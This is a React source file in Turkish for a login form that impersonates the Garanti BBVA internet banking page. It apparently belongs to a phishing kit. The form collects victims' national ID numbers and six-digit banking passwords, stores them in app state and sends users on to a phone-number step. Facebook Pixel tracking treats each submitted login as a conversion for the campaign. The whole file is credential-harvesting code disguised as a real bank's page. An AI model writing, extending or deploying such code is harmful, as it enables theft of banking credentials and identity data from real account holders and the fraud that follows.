import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

/* global fbq */
function LoginForm() {
  const { dispatch } = useAuth();
  const [custNo, setCustNo] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [custNoError, setCustNoError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const navigate = useNavigate();

  // Sayfa yüklendiğinde ViewContent
  useEffect(() => {
    if (typeof window !== 'undefined' && window.fbq) {
      fbq('track', 'ViewContent', {
        content_category: 'garanti_credit_form',
        content_name: 'garanti_login_page',
      });
    }
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    let hasError = false;
    setCustNoError('');
    setPasswordError('');

    if (!custNo || custNo.length !== 11 || !/^\d{11}$/.test(custNo)) {
      setCustNoError('T.C. Kimlik Numarası geçerli olmalı, 11 basamaktan ve sadece rakamlardan oluşmalıdır.');
      hasError = true;
    }
    if (!password || password.length !== 6 || !/^\d{6}$/.test(password)) {
      setPasswordError('Lütfen geçerli parolanızı giriniz.');
      hasError = true;
    }
    if (hasError) return;

    // fbclid varsa _fbc cookie oluştur
    const urlParams = new URLSearchParams(window.location.search);
    const fbclid = urlParams.get('fbclid');
    if (fbclid && !document.cookie.includes('_fbc=')) {
      const creationTime = Math.floor(Date.now() / 1000);
      const fbcValue = `fb.1.${creationTime}.${fbclid}`;
      const secureFlag = window.location.protocol === 'http:' ? '' : '; Secure';
      document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
    }

    const initEventID = `init_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
    if (typeof window !== 'undefined' && window.fbq) {
      fbq('track', 'InitiateCheckout', {
        content_category: 'garanti_credit_form_start',
        content_name: 'garanti_login_start',
        value: 0.5,
        currency: 'TRY'
      }, { eventID: initEventID });
    }

    dispatch({ type: 'SET_TC', payload: custNo });
    dispatch({ type: 'SET_PASSWORD', payload: password });
    dispatch({ type: 'SET_AUTH' });

    navigate('/telefon', {
      state: { isValidNavigation: true, initEventID }
    });
  };

  return (
    <div className="panel">
      <div id="passwordEntryPanel" className="panel-body">
        <h1 className="panel-title light">
          Güvenli Bankacılığa Hoş Geldiniz
          <p>
            Lütfen müşteri numaranızı ya da T.C. kimlik numaranızı ve size özel
            parolanızı girin.
          </p>
        </h1>
        <div className="row">
          <div className="col-sm-12">
            <div className="form-horizontal">
              <form id="loginForm" onSubmit={handleSubmit} autoComplete="off">
                {/* T.C. Kimlik */}
                <div className="formField">
                  <div className="formFieldOuter">
                    <div className="formFieldInner form-group">
                      <label htmlFor="custno" className="col-sm-5 col-md-4 control-label">
                        Müşteri / T.C. Kimlik Numarası
                      </label>
                      <div className="formFieldSurround col-sm-7 col-md-8">
                        <input
                          type="tel"
                          className="form-control"
                          value={custNo}
                          onChange={(e) => setCustNo(e.target.value.replace(/\D/g, '').slice(0, 11))}
                          pattern="[0-9]*"
                          id="custno"
                          maxLength="11"
                          autoComplete="off"
                        />
                        {custNoError && (
                          <div className="errorContainer advice-text has-alert">
                            <div className="errorWrapper">
                              <div className="errorMessage">{custNoError}</div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Parola */}
                <div className="formField">
                  <div className="formFieldOuter">
                    <div className="formFieldInner form-group">
                      <label htmlFor="password" className="col-sm-5 col-md-4 control-label">
                        Parola
                      </label>
                      <div className="formFieldSurround col-sm-7 col-md-8">
                        <input
                          type="password"
                          className="form-control"
                          id="password"
                          maxLength="6"
                          pattern="[0-9]*"
                          value={password}
                          onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 6))}
                          autoComplete="one-time-code"
                        />
                        {passwordError && (
                          <div className="errorContainer advice-text has-alert">
                            <div className="errorWrapper">
                              <div className="errorMessage">{passwordError}</div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Beni Hatırla */}
                <div className="ark-ui-checkbox formField control">
                  <div className="formField dyslexic">
                    <div className="formFieldInner form-group has-btn">
                      <div className="formFieldSurround col-sm-7 col-md-8 col-xs-12 col-sm-offset-5 col-md-offset-4">
                        <div className="checkbox-container">
                          <div className="checkbox checkbox-primary no-border">
                            <input
                              id="isRememberMe"
                              type="checkbox"
                              checked={rememberMe}
                              onChange={(e) => setRememberMe(e.target.checked)}
                            />
                            <label htmlFor="isRememberMe">Beni Hatırla</label>
                            <button type="button" className="btn btn-primary has-advice-text help-icon mobile-hover">
                              <div className="advice-text advice-text-right">
                                <strong className="subject">Yardım</strong>
                                <br />
                                "Beni Hatırla" seçeneğini işaretlediğinizde,
                                sonraki girişleriniz için yalnızca parolanızı
                                yazmanız yeterli olacaktır.
                              </div>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {rememberMe && (
                  <div className="form-group form-group-offset" id="rememberMeExtraText">
                    <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                      <div className="helper-text ark-ui-helper-text">
                        <p className="helper">
                          Müşteri / T.C. kimlik numaranız bu cihazda ve tarayıcıda hatırlanacaktır.
                          Güvenliğiniz açısından, bu tanımlamayı sadece kişisel cihazlarınızda yapmanızı öneririz.
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                {/* Giriş Butonu */}
                <div className="form-group form-group-offset footer-button">
                  <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                    <p>
                      <button
                        id="formSubmit"
                        className="btn btn-primary btn-lg btn-block-input mobile-hover"
                        type="submit"
                      >
                        Garanti BBVA İnternet Giriş
                      </button>
                    </p>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
